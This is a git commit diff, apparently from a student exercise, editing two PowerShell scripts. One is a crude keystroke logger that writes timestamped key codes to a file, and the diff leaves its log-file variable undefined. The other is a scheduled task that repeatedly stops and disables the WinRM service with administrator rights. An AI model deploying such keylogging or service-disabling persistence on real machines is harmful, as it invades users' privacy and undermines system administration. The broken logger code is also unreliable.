46fecc4a4fda12ef3df127ea91cdd3fb048d086a
Kyle <kam3634@rit.edu>
2023-11-19 22:47:50 -0500

    ans

--- logging.ps1
+++ logging.ps1
@@ -1,18 +1,14 @@
-# Create log file 
-$logFile = "C:\tmp\homebase.txt"
-
-# Script block for the key press event 
+# Script block for the key press event
 $keyDown = {
-  $key = $_.VirtualKeyCode
+  $key = $_.VirtualKeyCode 
   $date = Get-Date -Format "hh:mm:ss tt"
   Add-Content -Path $logFile -Value "$date - Key down: $key"
 }
 
 # Register the event handler
-Register-EngineEvent -SourceIdentifier KeyDown -Action $keyDown 
+Register-EngineEvent -SourceIdentifier KeyDown -Action $keyDown
 
 # Keep running to continue logging
 while ($true) {
-  Start-Sleep -Milliseconds 100  
+  Start-Sleep -Milliseconds 100
 }
-
--- winrm.ps1
+++ winrm.ps1
@@ -1,17 +1,18 @@
-# Create a scheduler action that stops and disables WinRM
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-Command "& {Stop-Service WinRM; Set-Service WinRM -StartupType Disabled}"' 
+# Create scheduled task action
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '& {Stop-Service WinRM; Set-Service WinRM -StartupType Disabled}'
 
-# Create a trigger that runs the task every 10 minutes  
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 10) 
+# Create trigger 
+$triggerDate = Get-Date
+$trigger = New-ScheduledTaskTrigger -Once -At $triggerDate -RepetitionInterval (New-TimeSpan -Minutes 10)
 
-# Create the task
-$taskName = "Disable WinRM"
+# Create task
+$taskName = "Disable WinRM" 
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Disables and stops the WinRM service every 10 minutes"
 
-# Get credentials to run the task with administrator rights
+# Get credentials
 $username = "administrator"
-$password = Read-Host -AsSecureString "Enter password"
+$password = Read-Host -Prompt "Enter password" -AsSecureString
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 
-# Register the task to run whether the user is logged in or not
-Register-ScheduledTask -TaskName $taskName -InputObject $task -User $credentials -RunLevel Highest
+# Register task
+Register-ScheduledTask -ParameterSetName RegisterTaskUser -TaskName $taskName -InputObject $task -UserName $credentials.UserName -Password $credentials.Password -RunLevel Highest
